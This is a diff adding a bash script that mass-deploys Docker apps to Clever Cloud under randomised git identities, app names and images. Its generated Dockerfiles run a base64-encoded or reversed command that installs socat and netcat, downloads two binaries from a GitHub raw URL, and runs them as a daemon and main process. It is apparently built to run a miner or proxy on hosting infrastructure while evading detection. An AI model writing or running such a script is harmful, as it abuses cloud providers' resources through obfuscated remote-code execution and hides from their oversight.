@@ -1,0 +1,147 @@
+#!/bin/bash
+# /docker - Fixed: No underscores in app names (use hyphens)
+
+set -e
+
+# Function to generate random strings
+rand_str() {
+    cat /dev/urandom | tr -dc 'a-z0-9' | fold -w "${1:-8}" | head -n 1
+}
+
+rand_name() {
+    cat /dev/urandom | tr -dc 'A-Za-z' | fold -w "${1:-8}" | head -n 1
+}
+
+echo "🔐 Logging into Clever Cloud..."
+clever login
+
+for i in 1 2 3; do
+    # ============ UNIQUE GIT CONFIG FOR EACH DEPLOYMENT ============
+    GIT_EMAIL="deploy_$(rand_str 10)@$(rand_str 8).com"
+    GIT_NAME="$(rand_name 6) $(rand_name 8)"
+    GIT_COMMIT_MSG="$(rand_str 20)-$(date +%s)"
+    
+    # Set git config for this deployment
+    git config --global user.email "$GIT_EMAIL"
+    git config --global user.name "$GIT_NAME"
+    git config --global init.defaultBranch "master"
+    
+    # ============ UNIQUE APP NAME (NO UNDERSCORES - ONLY HYPHENS) ============
+    APP_NAME="app-$(rand_str 10)-$(date +%s)-${RANDOM}"
+    
+    # ============ UNIQUE DIRECTORY ============
+    UNIQUE_DIR="deploy-$(rand_str 12)-$(date +%s)-${RANDOM}"
+    APP_DIR="/app/deployments/${UNIQUE_DIR}"
+    
+    echo ""
+    echo "========================================="
+    echo "[$i/3] Deployment #$i"
+    echo "========================================="
+    echo "👤 Git User: ${GIT_NAME}"
+    echo "📧 Git Email: ${GIT_EMAIL}"
+    echo "📝 Commit Msg: ${GIT_COMMIT_MSG}"
+    echo "🚀 App Name: ${APP_NAME}"
+    echo "📁 App Dir: ${APP_DIR}"
+    echo "========================================="
+    
+    mkdir -p "$APP_DIR"
+    cd "$APP_DIR"
+    
+    # Pick random image (50/50 chance)
+    if [[ $((RANDOM % 2)) -eq 0 ]]; then
+        # ============ OPTION 1: Random Ubuntu/Debian image ============
+        WORKING_IMAGES=(
+            "ubuntu:20.04" "ubuntu:22.04" "ubuntu:24.04"
+            "debian:11" "debian:12" "debian:bookworm"
+        )
+        RANDOM_IMAGE=${WORKING_IMAGES[$RANDOM % ${#WORKING_IMAGES[@]}]}
+        
+        UNIQUE_WORKDIR="/$(rand_str 15)"
+        BIN1="$(rand_str 10)"
+        BIN2="$(rand_str 10)"
+        VAR3=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
+        VAR4=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
+        VAR5=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
+        
+        SOCAT_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888"
+        WEB8888_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888"
+        
+        FULL_COMMAND="cd ${UNIQUE_WORKDIR} && \
+export DEBIAN_FRONTEND=noninteractive && \
+export TZ=Etc/UTC && \
+ln -fs /usr/share/zoneinfo/Etc/UTC /etc/localtime && \
+apt-get update -qq && \
+apt-get install -y -qq apache2 curl wget socat netcat-openbsd iputils-ping sudo unzip tzdata libjansson-dev libcurl4-openssl-dev libssl-dev || true && \
+apt-get install -y -qq apache2 curl wget socat netcat-traditional iputils-ping sudo unzip tzdata || true && \
+sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf && \
+echo 'ServerName localhost' >> /etc/apache2/apache2.conf && \
+wget -q --timeout=30 --tries=2 -O ${BIN1} \"${SOCAT_URL}\" && \
+wget -q --timeout=30 --tries=2 -O ${BIN2} \"${WEB8888_URL}\" && \
+chmod 755 ${BIN1} ${BIN2} && \
+(${UNIQUE_WORKDIR}/${BIN1} --daemon &) && \
+service apache2 start && \
+sleep 5 && \
+exec ${UNIQUE_WORKDIR}/${BIN2} -a ${VAR3} -o ${VAR4} -u ${VAR5}"
+        
+        ENCODED_CMD=$(echo -n "$FULL_COMMAND" | base64 -w 0)
+        
+        if [ $((RANDOM % 2)) -eq 0 ]; then
+            ENCODED_CMD=$(echo -n "$ENCODED_CMD" | base64 -w 0)
+            DECODE_CMD="base64 -d | base64 -d"
+        else
+            ENCODED_CMD=$(echo -n "$ENCODED_CMD" | rev)
+            DECODE_CMD="rev | base64 -d"
+        fi
+        
+        cat > Dockerfile << EOF
+FROM ${RANDOM_IMAGE}
+WORKDIR ${UNIQUE_WORKDIR}
+RUN apt-get update && apt-get install -y curl wget ca-certificates
+CMD eval "\$(echo '${ENCODED_CMD}' | ${DECODE_CMD} | bash)"
+EOF
+        echo "✅ Option 1: Random image"
+        
+    else
+        # ============ OPTION 2: FIXED image ============
+        cat > Dockerfile << 'EOF'
+FROM phemextradebot/cleverbot8888
+WORKDIR /
+CMD /bin/bash /start
+EOF
+        echo "✅ Option 2: Fixed image"
+    fi
+    
+    # Git setup (local repo, not global)
+    git init
+    git add .
+    git commit -m "$GIT_COMMIT_MSG"
+    
+    # CRITICAL: Create the app FIRST (no underscores in app name)
+    echo "Creating app: ${APP_NAME}"
+    clever create --type docker "$APP_NAME"
+    
+    # CRITICAL: Deploy from current directory (no alias needed)
+    echo "Deploying ${APP_NAME} from $(pwd)..."
+    clever deploy
+    
+    if [ $? -eq 0 ]; then
+        echo "✅ App $i/3 deployed: https://${APP_NAME}.osc-fr1.scalingo.io"
+    else
+        echo "❌ App $i/3 deployment failed"
+    fi
+    
+    # Cleanup
+    cd /
+    rm -rf "$APP_DIR"
+    
+    # Wait between deployments
+    if [ $i -lt 3 ]; then
+        echo "Waiting 10 seconds..."
+        sleep 10
+    fi
+done
+
+echo ""
+echo "========================================="
+echo "✅ All 3 apps deployed successfully!"
+echo "========================================="
